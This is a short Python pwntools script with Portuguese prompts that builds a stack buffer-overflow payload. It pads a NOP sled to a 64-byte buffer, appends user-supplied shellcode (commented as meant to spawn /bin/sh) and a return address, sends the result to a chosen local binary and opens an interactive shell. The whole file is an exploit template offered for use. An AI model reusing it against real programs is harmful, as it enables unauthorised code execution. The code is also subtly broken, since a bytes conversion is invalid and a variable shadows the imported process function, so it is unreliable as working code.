from pwn import *


def main():
    secret_address = int(input("[>] endereço: "))  # Certifique-se de que é um número inteiro

    # Shellcode para executar /bin/sh (exemplo)
    shellcode = b(input("[>] shellcode: "))
    inputin = input("[>] diretório: ")

    # Tamanho do buffer e construir o NOP sled
    buffer_size = 64
    nop_sled = b'\x90' * (buffer_size - len(shellcode) - 4)  # 4 bytes para o endereço
    payload = nop_sled + shellcode + p32(secret_address)

    # Enviar o payload
    process = process(inputin)
    process.sendline(payload)
    process.interactive()

if __name__ == "__main__":
    main()
